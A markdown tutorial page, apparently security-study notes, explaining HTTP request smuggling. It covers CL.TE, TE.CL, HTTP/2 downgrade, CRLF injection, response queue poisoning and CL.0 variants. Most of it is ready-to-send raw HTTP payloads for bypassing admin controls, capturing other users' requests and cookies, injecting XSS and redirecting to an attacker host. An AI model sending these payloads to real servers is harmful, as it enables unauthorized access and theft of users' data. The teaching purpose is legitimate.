---
title: "HTTP request smuggling"
weight: 12
---

# HTTP request smuggling

{{< details summary="General info" >}}

* HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.

- Request smuggling is associated to HTTP/1 requests but can also affect HTTP/2-supported websites based on their backend structure.

* Modern web apps often use chains of HTTP servers, with users sending requests to a front-end server (sometimes referred to as a load balancer or reverse proxy), which in turn forwards requests to multiple back-end servers.

- Front-end and back-end systems must agree on request boundaries to prevent ambiguous requests that attackers can exploit.

{{< /details >}}

{{< details summary="How do HTTP request smuggling vulnerabilities arise?" >}}

HTTP request smuggling vulnerabilities often occur due to the HTTP/1 specification offering two methods to define the request's end: the `Content-Length` header and `Transfer-Encoding` header.
  * The `Content-Length header` specifies the length of the message body in bytes
  * The `Transfer-Encoding` header specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data
    * Each chunk comprises a size in hexadecimal bytes, a newline, and the chunk's content. The message concludes with a zero-sized chunk.

Type of HTTP-request-smuggling
  * TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
  * CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
  * TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

{{< /details >}}

## Identification

{{< hint style=warning >}}
**Important**:

* `Connection` header mustn't be set to `close`. Set it to `keep-alive`.
* In early techniques you must use `HTTP/1.1` protocol, not `HTTP/2`. In burp change it using Inspector.
{{< /hint >}}

### CL.TE

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 4\r\n
\r\n
1\r\n
A\r\n
X
```

`Content-Length=4` -> `1` `\r` `\n` `A`

* The **front-end** server processes the initial chunk based on the Transfer-Encoding header, forwarding only part of the request while omitting the `X`.&#x20;
* After processing the first chunk, the **backend** server waits for the next one, causing a noticeable time delay.

### TE.CL

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
X
```

`Content-Length=6` -> `0` `\r` `\n` `\r` `\n` `X`

The back-end server, relying on the Content-Length header, waits for additional message body content, resulting in a noticeable time delay.

{{< hint style=warning >}}
**Warning**: The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
{{< /hint >}}

## Confirmation/Exploitation

Normal request

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

### CL.TE

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

`Content-Length: 49` -> all chars until `Foo:x` (include `\r\n`)

`e` (hex) -> Length `q=smuggling&x=`

Then send normal request. This will cause the subsequent "normal" request to look like this:

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The server will respond with status code 404, indicating that the attack successful.

### TE.CL

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0\r\n
\r\n
```

`7b` -> all chars from `GET` until `x=`

`Content-Length: 4` -> `7` `c` `\r` `\n`

{{< hint style=notes >}}
**Note**: Update Content-Length must be unchecked
{{< /hint >}}

## Exploitation

### Bypass front-end security controls

**CL.TE**

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

When you go to `/home`, the following request will be made&#x20;

```http
GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

* The front-end server sees two requests here, both for `/home`, and so the requests are forwarded to the back-end server.&#x20;
* The back-end server sees requests for `/home` and `/admin`, assumes they've passed front-end controls, and grants access to the restricted URL.

### Revealing front-end request rewriting

**CL.TE**

Find a request that reflects the value

```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=user@normal-user.net
```

```html
<input id="email" value="user@normal-user.net" type="text">
```

Use the following request smuggling attack to reveal the rewriting

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=
```

```html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

### Capturing other users' requests

**CL.TE**

Smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 198
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Cookie: session=dL3MaAvRhsnHdriaFnPxSdvXdt3jx6B1
Content-Length: 650

csrf=ihmEx8D&postId=1&name=test&email=test@test.test&comment=
```

{{< hint style=notes >}}
**Note**: One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the `&` character, meaning that the content that is stored from the victim user's request will end at the first `&`, which might even appear in the query string
{{< /hint >}}

{{< hint style=tips >}}
**Tip**: Another way to steal other users' responses is with the [#response-queue-poisoning](http-request-smuggling.md#response-queue-poisoning "mention") technique.
{{< /hint >}}

### Exploit reflected XSS

**CL.TE**

You can use a request smuggling attack to target other users of the application. This method is better than standard reflected XSS because it doesn't require victim interaction and can exploit XSS in areas like HTTP headers, which are not possible to control in typical attacks.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

The next user's request is appended to the smuggled one, delivering the XSS payload in their response.

### Open redirect

**CL.TE**

```http
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

Exploit

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

## Content-Length in the smuggled request

The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.

## HTTP/2 request smuggling

**HTTP/2 downgrading**

HTTP/2 downgrading converts HTTP/2 requests into HTTP/1 syntax, allowing web servers and proxies to support HTTP/2 clients while communicating with HTTP/1 back-end servers.

## Identification

### H2.CL

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

GET /404 HTTP/1.1
Foo: x
```

Then send another request and you'll get `/404` .

### H2.TE

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

## Exploitation

### H2.CL

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 5

x=1
```

### H2.TE

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

## Request smuggling via CRLF injection

In HTTP/2 messages `\r\n` no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split. when this is rewritten as an HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers.

E.g. with **H2.TE**

```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
foo: \r\nTransfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

{{< hint style=notes >}}
**Note**: to inject newlines into HTTP/2 headers, in burp use the Inspector to drill down into the header, then press the `Shift + Return` keys.
{{< /hint >}}

## Response queue poisoning

{{< details summary="Theory (in short)" >}}

When you smuggle a complete request, the front-end server processes a single request, but the back-end sees two requests and sends two responses. The front-end forwards the first response correctly but queues the unexpected second response. When a new request arrives, the front-end mistakenly sends the leftover response from the smuggled request, leaving the correct back-end response unmatched. This cycle repeats, disrupting the response flow for subsequent requests.

{{< /details >}}

This attack can occur through HTTP/1 request smuggling or HTTP/2 downgrading.

You need to smuggle a complete request.

With this technique you can steal other users' responses.

**(CL)**

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

## HTTP/2 request splitting

This approach is more versatile, allowing even GET requests without relying on methods that support a body.

```http
:method	        GET
:path	        /
:authority      vulnerable-website.com
foo             bar\r\n
                \r\n
                GET /admin HTTP/1.1\r\n
                Host: vulnerable-website.com
```

During rewriting, some front-end servers append the new `Host` header after existing ones. With HTTP/2, this places it after the `foo` header, leaving the first request without a `Host` header and the smuggled one with two. Inject your `Host` header so that it ends up in the first request once.

```http
:method	        GET
:path	        /
:authority      vulnerable-website.com
foo             bar\r\n
                Host: vulnerable-website.com\r\n
                \r\n
                GET /admin HTTP/1.1
```

{{< hint style=notes >}}
**Note**: here the request trigger response queue poisoning, but you can also smuggle prefixes for classic request smuggling.
{{< /hint >}}

## CL.0/H2.0 request smuggling

Some servers ignore the `Content-Length` header, treating requests as ending at the headers, effectively making `Content-Length 0`. If the back-end behaves this way while the front-end uses Content-Length, this discrepancy enables HTTP request smuggling, termed a "CL.0" vulnerability.

**Find an endpoint that ignores Content-Length**

* POST request to a static file
* POST request to server level redirect (`Location` header in the response)
* POST request that triggers a server side error

**Exploitation**

1. Create one tab containing the setup request and another containing an arbitrary follow-up request.
2. Add the two tabs to a group in the correct order.
3. Change the Connection header to `keep-alive`.
4. Send group in sequence (single connection)

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /404 HTTP/1.1
Foo: x
```



